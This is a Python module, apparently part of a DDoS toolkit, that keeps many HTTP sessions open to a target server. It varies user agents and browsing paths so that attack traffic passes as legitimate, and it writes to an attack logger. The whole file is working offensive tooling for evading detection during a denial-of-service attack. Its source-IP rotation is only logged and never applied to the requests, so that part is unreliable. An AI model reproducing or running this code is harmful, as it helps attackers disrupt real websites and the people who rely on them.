"""
Session Management Module for Advanced DDoS Attacks

This module provides sophisticated session management capabilities
to maintain legitimate-looking connections and traffic patterns.
"""

import time
import random
import threading
import logging
import uuid
import requests

# Get the centralized attack logger
attack_logger = logging.getLogger('attack_logger')


class SessionMaintainer:
    """Maintains persistent sessions to appear legitimate."""
    
    def __init__(self, ip_rotator):
        """
        Initialize session maintainer with IP rotator.
        
        Args:
            ip_rotator: IPRotator instance for source IP management
        """
        self.ip_rotator = ip_rotator
        self.sessions = {}  # Store session info for different targets
        self.lock = threading.Lock()
    
    def create_session(self, target):
        """
        Create and maintain a legitimate looking session.
        
        Args:
            target: Target server address
        
        Returns:
            str: Session ID if successful, None if failed
        """
        src_ip = self.ip_rotator.get_random_ip()
        session_id = str(uuid.uuid4())  # Generate a unique session ID
        
        try:
            # Create an actual HTTP session
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
                ]),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'Accept-Language': 'en-US,en;q=0.5'
            })
            
            # Make initial request to get cookies/session info
            response = session.get(f"http://{target}/", timeout=2)
            
            # Store the session info
            with self.lock:
                self.sessions[session_id] = {  # Use session_id as key
                    'src_ip': src_ip,
                    'session': session,
                    'cookies': session.cookies,
                    'last_page': '/',
                    'created': time.time()
                }
                
            attack_logger.debug(f"Session {session_id}: Created legitimate session from {src_ip}")
            return session_id
        except Exception as e:
            attack_logger.debug(f"Session {session_id}: Failed to create session from {src_ip}: {e}")
            return None
    
    def maintain_sessions(self, target, session_count=10, duration=300):
        """
        Create and maintain multiple legitimate-looking sessions.
        
        Args:
            target: Target server address
            session_count: Number of sessions to maintain
            duration: Duration to maintain sessions (seconds)
        """
        attack_logger.info(f"Maintaining {session_count} legitimate sessions with {target}")
        
        # Create initial sessions
        active_session_ids = []
        for _ in range(session_count):
            session_id = self.create_session(target)
            if session_id:
                active_session_ids.append(session_id)
            time.sleep(random.uniform(1, 3))
        
        # Maintain sessions for duration
        end_time = time.time() + duration
        while time.time() < end_time:
            # Randomly select a session to interact with
            if active_session_ids:
                session_id = random.choice(active_session_ids)
                session_info = self.sessions.get(session_id)
                
                if session_info:
                    try:
                        # Make a legitimate-looking request
                        session = session_info['session']
                        
                        # Choose a page to visit based on previous page
                        if session_info['last_page'] == '/':
                            next_page = random.choice(['/about', '/products', '/contact'])
                        elif session_info['last_page'] == '/products':
                            next_page = f'/product/{random.randint(1, 100)}'
                        else:
                            next_page = '/'
                            
                        # Make the request
                        response = session.get(f"http://{target}{next_page}", timeout=2)
                        
                        # Update session info
                        with self.lock:
                            session_info['last_page'] = next_page
                            session_info['last_activity'] = time.time()
                        
                        attack_logger.debug(f"Session {session_id}: Visited {next_page}")
                    except Exception as e:
                        # Handle failed request - might need to create new session
                        attack_logger.debug(f"Session {session_id}: Interaction failed: {e}")
                        active_session_ids.remove(session_id)
                        # Clean up the failed session from self.sessions
                        if session_id in self.sessions:
                            with self.lock:
                                del self.sessions[session_id]
                        new_id = self.create_session(target)
                        if new_id:
                            active_session_ids.append(new_id)
            
            # Sleep between interactions
            time.sleep(random.uniform(5, 15))
        
        # Clean up sessions
        attack_logger.info("Cleaning up sessions")
        for session_id in active_session_ids:
            if session_id in self.sessions:
                with self.lock:
                    del self.sessions[session_id]